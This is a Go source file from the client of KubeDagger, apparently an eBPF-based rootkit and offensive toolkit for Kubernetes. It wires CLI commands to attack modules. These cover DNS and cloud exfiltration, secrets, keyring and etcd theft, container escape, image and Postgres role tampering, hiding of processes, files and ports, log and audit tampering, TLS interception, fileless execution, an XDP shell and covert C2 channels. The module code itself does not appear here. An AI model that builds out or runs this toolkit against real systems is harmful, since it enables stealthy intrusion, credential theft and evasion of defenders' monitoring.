/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package run

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_exfil"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_meta"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cri_tamper"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/daemonset"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/escape"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/evasion"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_abuse"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/meshbypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/netbypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/obs_poison"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/secrets"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/webhook"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dashboard"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dns_exfil"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/docker"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/fs_watch"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/mitre"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/network_discovery"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pipe_prog"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/postgres"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/proctree"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/keyring"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tls_intercept"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/etcd_theft"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/log_tamper"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/syscall_bypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/audit_filter"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pcap_blind"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/coredump"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/timeskew"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/polymorph"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/fileless"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/xdp_shell"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/bpf_ipc"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_event_c2"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/container_log_c2"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tcp_stego"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/doh_c2"
)

func addFSWatchCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return fs_watch.SendAddFSWatchRequest(options.Target, args[0], options.InContainer, options.Active)
}

func deleteFSWatchCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return fs_watch.SendDeleteFSWatchRequest(options.Target, args[0], options.InContainer, options.Active)
}

func getFSWatchCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return fs_watch.SendGetFSWatchRequest(options.Target, args[0], options.InContainer, options.Active, options.Output)
}

func putPipeProgCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	if len(options.From) > 16 {
		return fmt.Errorf("'from' command too long (max is 16 chars): %s", options.From)
	}
	if strings.Contains(options.From, "#") {
		return fmt.Errorf("'from' contains an illegal character ('#'): %s", options.From)
	}
	if len(options.To) > 16 || len(options.To) == 0 {
		return fmt.Errorf("'to' command too long (max is 16 chars, min 1 char): %s", options.To)
	}
	if strings.Contains(options.To, "#") {
		return fmt.Errorf("'to' contains an illegal character ('#'): %s", options.To)
	}
	if strings.Contains(args[0], "_") {
		return fmt.Errorf("the piped program cannot contain a '_' character: %s", args[0])
	}

	return pipe_prog.SendPutPipeProgRequest(options.Backup, options.Target, options.From, options.To, args[0])
}

func delPipeProgCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	if len(options.From) > 16 {
		return fmt.Errorf("'from' command too long (max is 16 chars): %s", options.From)
	}
	if strings.Contains(options.From, "#") {
		return fmt.Errorf("'from' contains an illegal character ('#'): %s", options.From)
	}
	if len(options.To) > 16 || len(options.To) == 0 {
		return fmt.Errorf("'to' command too long (max is 16 chars, min 1 char): %s", options.To)
	}
	if strings.Contains(options.To, "#") {
		return fmt.Errorf("'to' contains an illegal character ('#'): %s", options.To)
	}

	return pipe_prog.SendDelPipeProgRequest(options.Target, options.From, options.To)
}

func getImagesListCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return docker.SendGetImagesListRequest(options.Target, options.Output)
}

func putDockerImageOverrideCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	if len(options.From) == 0 {
		return fmt.Errorf("'from' image is required")
	}
	if len(options.To) >= 64 || len(options.From) >= 64 {
		return fmt.Errorf("'from' and 'to' image names must be at most 63 characters long: %s, %s", options.From, options.To)
	}
	if strings.Contains(options.From, "#") || strings.Contains(options.To, "#") {
		return fmt.Errorf("'from' and 'to' image names cannot contain '#': %s, %s", options.From, options.To)
	}
	return docker.SendPutImageOverrideRequest(options.Target, options.From, options.To, options.Override, options.Ping)
}

func delDockerImageOverrideCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	if len(options.From) == 0 {
		return fmt.Errorf("'from' image is required")
	}
	if len(options.From) >= 64 {
		return fmt.Errorf("'from' image name must be at most 63 characters long: %s", options.From)
	}
	if strings.Contains(options.From, "#") {
		return fmt.Errorf("'from' image name cannot contain '#': %s", options.From)
	}
	return docker.SendDelImageOverrideRequest(options.Target, options.From)
}

func getPostgresCredentialsCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return postgres.SendGetPostgresSecretsListRequest(options.Target, options.Output)
}

func putPostgresRoleCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	if len(options.Role) == 0 {
		return fmt.Errorf("'role' is required")
	}
	if len(options.Role) >= model.PostgresRoleLen {
		return fmt.Errorf("'role' must be at most %d characters long: %s", model.PostgresRoleLen, options.Role)
	}
	if strings.Contains(options.Role, "#") {
		return fmt.Errorf("'role' cannot contain '#': %s", options.Role)
	}
	return postgres.SendPutPostgresRoleRequest(options.Target, options.Role, options.Secret)
}

func delPostgresRoleCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	if len(options.Role) == 0 {
		return fmt.Errorf("'role' is required")
	}
	if len(options.Role) >= model.PostgresRoleLen {
		return fmt.Errorf("'role' must be at most %d characters long: %s", model.PostgresRoleLen, options.Role)
	}
	if strings.Contains(options.Role, "#") {
		return fmt.Errorf("'role' cannot contain '#': %s", options.Role)
	}
	return postgres.SendDelPostgresRoleRequest(options.Target, options.Role)
}

func mitreExportCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	switch options.MitreFormat {
	case "json":
		return mitre.ExportNavigatorJSON(options.Output)
	case "markdown":
		return mitre.ExportMarkdown(options.Output)
	default:
		return fmt.Errorf("unsupported format: %s (use 'json' or 'markdown')", options.MitreFormat)
	}
}

func dashboardCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return dashboard.Run(options.Target, options.RefreshRate)
}

func k8sDiscoverCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return k8s.Discover(options.K8sNamespace, options.Output)
}

func dnsExfilCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	if options.ExfilFile == "" {
		return fmt.Errorf("--file is required")
	}
	if options.ExfilDomain == "" {
		return fmt.Errorf("--domain is required")
	}
	return dns_exfil.Exfiltrate(options.ExfilFile, options.ExfilDomain, options.DNSServer)
}

func procTreeGetCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	entries, err := proctree.FetchProcessTree(options.Target)
	if err != nil {
		return err
	}
	proctree.PrintTree(entries)
	return nil
}

func cloudMetaCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	result, err := cloud_meta.FetchMetadata(options.CloudProvider)
	if err != nil {
		return err
	}
	return cloud_meta.PrintResult(result)
}

func k8sAbuseCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return k8s_abuse.Execute(options.K8sAction, options.K8sToken, options.K8sNamespace, options.Output)
}

func secretsHarvestCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return secrets.Harvest(options.SecretSources, options.Output)
}

func escapeCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return escape.Execute(options.EscapeAction, options.EscapeTechnique, options.Output)
}

func evasionCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return evasion.Enable(options.Target, options.EvasionMode, options.Output)
}

func netBypassCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return netbypass.Execute(options.Target, options.BypassMode, options.DestIP, options.DestPort, options.Output)
}

func meshBypassCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return meshbypass.Execute(options.Target, options.MeshBypassMode, options.MeshTarget, options.Output)
}

func cloudExfilCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return cloud_exfil.Execute(options.Target, options.ExfilProvider, options.ExfilBucket, options.ExfilPath, options.ExfilCredsFrom, options.Output)
}

func obsPoisonCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return obs_poison.Execute(options.Target, options.PoisonTarget, options.PoisonEndpoint, options.PoisonStrategy, options.Output)
}

func webhookCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	switch options.WebhookAction {
	case "deploy":
		return webhook.Deploy(options.WebhookNamespace, options.WebhookImage, options.Output)
	case "remove":
		return webhook.Remove(options.WebhookNamespace, options.Output)
	default:
		return fmt.Errorf("unsupported webhook action: %s (use 'deploy' or 'remove')", options.WebhookAction)
	}
}

func criTamperCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return cri_tamper.Execute(options.Target, options.CRIRuntime, options.CRIMode, options.CRITargetImage, options.CRIInjectBinary, options.Output)
}

func daemonSetCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	switch options.DaemonSetAction {
	case "deploy":
		return daemonset.Deploy(options.K8sNamespace, options.DaemonSetImage, options.DaemonSetName, options.Output)
	case "remove":
		return daemonset.Remove(options.K8sNamespace, options.DaemonSetName, options.Output)
	case "status":
		return daemonset.Status(options.K8sNamespace, options.DaemonSetName, options.Output)
	default:
		return fmt.Errorf("unsupported daemonset action: %s (use 'deploy', 'remove', or 'status')", options.DaemonSetAction)
	}
}

func keyringCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return keyring.Steal(options.Target, options.KeyringMode, options.KeyringKeyType, options.Output)
}

func tlsInterceptCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return tls_intercept.Execute(options.Target, options.TLSAction, options.TLSTargetPID, options.TLSLib, options.Output)
}

func etcdTheftCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return etcd_theft.Execute(options.Target, options.EtcdMode, options.EtcdKeyPrefix, options.Output)
}

func logTamperCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return log_tamper.Execute(options.Target, options.LogTamperMode, options.LogTamperPattern, options.LogTamperTarget, options.Output)
}

func syscallBypassCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return syscall_bypass.Execute(options.Target, options.SyscallHidePIDs, options.SyscallHideFiles, options.SyscallHidePorts, options.Output)
}

func auditFilterCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return audit_filter.Execute(options.Target, options.AuditFilterMode, options.AuditFilterPIDs, options.Output)
}

func pcapBlindCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return pcap_blind.Execute(options.Target, options.PcapHidePorts, options.PcapHideIPs, options.Output)
}

func coredumpCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return coredump.Execute(options.Target, options.CoredumpPIDs, options.Output)
}

func timeskewCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return timeskew.Execute(options.Target, options.TimeskewPIDs, options.TimeskewOffset, options.TimeskewMode, options.Output)
}

func polymorphCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return polymorph.Execute(options.Target, options.PolymorphSeed, options.Output)
}

func filelessCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return fileless.Execute(options.Target, options.FilelessPayload, options.FilelessFakeName, options.Output)
}

func xdpShellCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return xdp_shell.Execute(options.Target, options.XDPShellConnect, options.XDPShellProtocol, options.Output)
}

func bpfIPCCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return bpf_ipc.Execute(options.Target, options.BPFIPCAction, options.BPFIPCChannel, options.BPFIPCMessage, options.Output)
}

func k8sEventC2Cmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return k8s_event_c2.Execute(options.Target, options.K8sC2Namespace, options.K8sC2Beacon, options.Output)
}

func containerLogC2Cmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return container_log_c2.Execute(options.Target, options.LogC2Container, options.LogC2Encoding, options.Output)
}

func tcpStegoCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return tcp_stego.Execute(options.Target, options.TCPStegoData, options.TCPStegoDest, options.TCPStegoBPP, options.Output)
}

func dohC2Cmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	return doh_c2.Execute(options.Target, options.DoHC2Resolver, options.DoHC2Domain, options.Output)
}

func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)

	return network_discovery.SendGetNetworkDiscoveryRequest(options.Target, options.ActiveDiscovery, options.PassiveDiscovery)
}

var ipv4Regex = `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`

func getNetworkDiscoveryScanCmd(cmd *cobra.Command, args []string) error {
	logrus.SetLevel(options.LogLevel)
	if len(options.Range) == 0 || len(options.Range) >= 6 {
		return fmt.Errorf("invalid 'range' value: %s (has ton be above 0 and below 100k)", options.Range)
	}
	match, _ := regexp.MatchString(ipv4Regex, options.IP)
	if !match {
		return fmt.Errorf("invalid 'IP' format (expected X.X.X.X): %s", options.IP)
	}
	if len(options.Port) == 0 || len(options.Port) >= 6 {
		return fmt.Errorf("invlid 'Port' value: %s", options.Port)
	}
	return network_discovery.SendNetworkDiscoveryScanRequest(options.Target, options.IP, options.Port, options.Range)
}
